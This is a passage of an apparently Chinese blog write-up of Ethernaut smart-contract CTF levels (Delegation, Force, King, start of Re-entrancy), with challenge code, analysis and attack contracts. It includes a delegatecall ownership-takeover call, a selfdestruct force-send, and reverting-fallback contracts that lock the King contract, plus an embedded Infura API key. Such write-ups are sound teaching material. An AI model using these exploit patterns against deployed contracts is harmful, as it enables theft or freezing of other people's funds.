keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Delegate</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    owner <span class=\"token operator\">=</span> _owner<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Delegation</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n  Delegate delegate<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _delegateAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    delegate <span class=\"token operator\">=</span> <span class=\"token function\">Delegate</span><span class=\"token punctuation\">(</span>_delegateAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> result<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>delegate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-6\"><a href=\"#Analyze-6\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p><a href=\"https://blog.csdn.net/powervip/article/details/104330170\">三种调用方式的异同点</a></p>\n<ul>\n<li>call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。</li>\n<li>delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。</li>\n<li>callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。+</li>\n</ul>\n<hr>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281243245.png\"></p>\n<p>情况 1：call<br>A合约：<br>temp1 &#x3D; 0<br>temp2 &#x3D; 0</p>\n<p>B合约：<br>temp1 &#x3D; A合约地址<br>temp2 &#x3D; 100</p>\n<p>说明：call调用后内置变量 msg 的值会修改为调用者（A合约地址），执行环境为被调用者（B合约）的运行环境(运行环境指合约的 storage)</p>\n<hr>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281243581.png\"></p>\n<p>情况 2：delegatecall<br>A合约：<br>temp1 &#x3D; 调用A合约的以太坊账号地址<br>temp2 &#x3D; 100</p>\n<p>B合约：<br>temp1 &#x3D; 0<br>temp2 &#x3D; 0</p>\n<p>说明：delegatecall调用后内置变量 msg 的值不会修改为调用者（A合约地址），但执行环境为调用者（A合约）的运行环境</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281243774.png\"></p>\n<p><strong>情况 3：callcode</strong><br>A合约：<br>temp1 &#x3D; A合约地址<br>temp2 &#x3D; 100</p>\n<p>B合约：<br>temp1 &#x3D; 0<br>temp2 &#x3D; 0</p>\n<p>说明：callcode调用后内置变量 msg 的值会修改为调用者（A合约地址），但执行环境为调用者（A合约）的运行环境。</p>\n<hr>\n<h2 id=\"Attack-6\"><a href=\"#Attack-6\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><p>poc1</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">首先学习将函数转换为bytes格式\ncontract transform&#123;\n    bytes4 public result;\n    function trans() public &#123;\n        result&#x3D;bytes(keccak256(&quot;pwn()&quot;));\n    &#125;\n&#125;&#x2F;&#x2F;结果为0xdd365b8b\n接下来进行攻击\nawait contract.sendTransaction(&#123;data:&quot;0xdd365b8b&quot;&#125;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>poc2</p>\n<p><a href=\"https://blog.csdn.net/tianlongtc/article/details/80220237\">call函数学习链接①</a></p>\n<p><a href=\"https://ethereum.stackexchange.com/questions/8168/understanding-namereg-callregister-myname-style-call-between-contracts\">call函数学习链接②</a></p>\n<p><a href=\"https://www.cnblogs.com/gzhlt/p/9997798.html\">call函数学习链接③</a></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">contract attack&#123;\n    address target &#x3D;0xd2a5bC10698FD955D1Fe6cb468a17809A08fd005;\n    bytes4 public result;\n    function trandform()public&#123;\n    result&#x3D;bytes4(keccak256(&quot;pwn()&quot;));\n&#125;&#x2F;&#x2F;获得bytes4签名\n    function pwn() public payable&#123;\n    target.call(abi.encodePacked(result,&quot;&quot;));\n&#125;&#x2F;&#x2F;传入参数进行攻击\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h1 id=\"8-Force\"><a href=\"#8-Force\" class=\"headerlink\" title=\"8.Force\"></a>8.Force</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：有些合约就是拒绝你的付款,就是这么任性<code>¯\\_(ツ)_/¯</code>，这一关的目标是使合约的余额大于0</p>\n<p> 这可能有帮助:</p>\n<ul>\n<li>Fallback 方法</li>\n<li>有时候攻击一个合约最好的方法是使用另一个合约.</li>\n<li>阅读上方的帮助页面, “控制台之外” 部分</li>\n</ul></blockquote>\n<h2 id=\"Code-7\"><a href=\"#Code-7\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Force</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n\n*/</span><span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-7\"><a href=\"#Analyze-7\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>合约为空白合约，而题目要求是使合约余额大于0，所以想到了自毁函数，可以强制性向目标转账</p>\n<h2 id=\"Attack-7\"><a href=\"#Attack-7\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span><span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> target<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">selfdestruct</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//销毁当前合约，并且把当前合约的余额发送指定地址，，执行Kill方法，并指定一个address；执行后，当前合约将被销毁，当前合约的以太币将被发送至这个指定的address。且此合约不再有可执行的方法</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281243412.png\"></p>\n<h1 id=\"9-King\"><a href=\"#9-King\" class=\"headerlink\" title=\"9.King\"></a>9.King</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.这么有趣的游戏, 你的目标是攻破他.当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.</p></blockquote>\n<h2 id=\"Code-8\"><a href=\"#Code-8\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">King</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> king<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> prize<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>  \n    king <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    prize <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">>=</span> prize <span class=\"token operator\">||</span> msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    king<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    king <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    prize <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">_king</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> king<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-8\"><a href=\"#Analyze-8\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>实例生成后要使用web3.js查询原始的prize，分析合约可知prize存储在slot1，king存储在slot0</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> web3 <span class=\"token keyword\">import</span> Web3<span class=\"token punctuation\">,</span>HTTPProvider\n<span class=\"token keyword\">import</span> json<span class=\"token punctuation\">,</span>binascii\nhttp <span class=\"token operator\">=</span> <span class=\"token string\">'https://rinkeby.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab'</span>\nweb3 <span class=\"token operator\">=</span> Web3<span class=\"token punctuation\">(</span>HTTPProvider<span class=\"token punctuation\">(</span>http<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>binascii<span class=\"token punctuation\">.</span>b2a_hex<span class=\"token punctuation\">(</span>web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getStorageAt<span class=\"token punctuation\">(</span><span class=\"token string\">\"0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>合约prize查询\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>binascii<span class=\"token punctuation\">.</span>b2a_hex<span class=\"token punctuation\">(</span>web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getStorageAt<span class=\"token punctuation\">(</span><span class=\"token string\">\"0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>合约中的king查询<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>题目会进行king的重申，而transfer函数不同于call和send，call和send函数执行后会返回true或者false，transfer函数执行失败后会进行回滚(revert)所以我们将king变成自己后提交实例时要阻止关卡对于king的重申，简单来说就是让关卡触发receive函数时失败。此时这道题有两个切入点①可以使用require(false),使得transfer函数发生回滚切入点②直接使用revert让关卡在想攻击合约转账时失败以上两种方法可以使漏洞合约中的transfer函数执行失败从而进行回滚导致king的重申失败</p>\n<p>了解到了，transfer执行失败后会回滚transfer之前的代码(但是transfer本身不会进行回滚)(这是自己的理解，应该是正确的)</p>\n<h2 id=\"Attack-8\"><a href=\"#Attack-8\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><p>poc1</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> target <span class=\"token operator\">=</span><span class=\"token number\">0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value <span class=\"token punctuation\">:</span> <span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>poc2</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">contract attack&#123;\n    address target &#x3D;0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909;\n    function attack() payable public &#123;\n        target.call&#123;value : 0.001 ether&#125;(&quot;&quot;);\n    &#125;\n    fallback() external payable &#123;\n        revert();\n    &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>写好攻击合约后进行了n+n次攻击，evm中显示交易成功但是_king始终不变，卡住了约两个小时以后打开了etherscan发现了万恶的<em>Out Of Gas</em>问题</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281243265.png\"></p>\n<p>调高gas限制后再次尝试成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281243355.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281244572.png\"></p>\n<h1 id=\"10-Re-entrancy\"><a href=\"#10-Re-entrancy\" class=\"headerlink\" title=\"10.Re-entrancy\"></a>10.Re-entrancy</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：这一关的目标是偷走合约的所有资产.</p></blockquote>\n<h2 id=\"Code-9\"><a href=\"#Code-9\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Reentrance</span> <span class=\"token punctuation\">&#123;</span>\n  \n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">donate</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n    balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _who<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> balances<span class=\"token punctuation\">[</span>_who<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> result<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span>_amount<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        _amount<span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      balances<span class=\"token 